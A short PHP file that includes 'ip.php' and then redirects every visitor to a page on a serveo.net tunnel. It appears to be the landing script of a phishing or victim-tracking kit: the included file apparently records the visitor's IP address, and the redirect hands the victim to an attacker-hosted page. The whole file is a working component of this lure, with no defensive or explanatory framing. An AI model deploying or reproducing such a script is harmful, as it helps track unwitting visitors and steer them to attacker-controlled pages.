<?php
include 'ip.php';
header('Location: https://8b756e2731c71ff4624ef529178bf562.serveo.net/index2.html');
exit
?>
